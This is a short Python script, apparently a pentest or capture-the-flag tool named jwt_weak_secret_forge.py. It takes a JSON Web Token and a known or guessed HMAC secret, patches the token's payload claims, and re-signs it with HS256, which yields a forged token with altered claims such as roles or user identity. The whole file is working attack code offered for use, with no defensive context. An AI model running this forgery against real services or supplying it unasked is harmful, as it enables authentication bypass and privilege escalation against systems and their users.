import sys, json, hmac, hashlib, base64

def b64u_dec(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())

def b64u_enc(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def sign(h, p, secret):
    msg = (h + '.' + p).encode()
    return b64u_enc(hmac.new(secret.encode(), msg, hashlib.sha256).digest())

if len(sys.argv) < 4:
    print("usage: python jwt_weak_secret_forge.py <jwt> <secret> '<json_patch>'")
    sys.exit(1)

tok, secret, patch = sys.argv[1], sys.argv[2], json.loads(sys.argv[3])
h, p, s = tok.split('.')
payload = json.loads(b64u_dec(p))
payload.update(patch)
new_p = b64u_enc(json.dumps(payload, separators=(',', ':')).encode())
print(h + '.' + new_p + '.' + sign(h, new_p, secret))
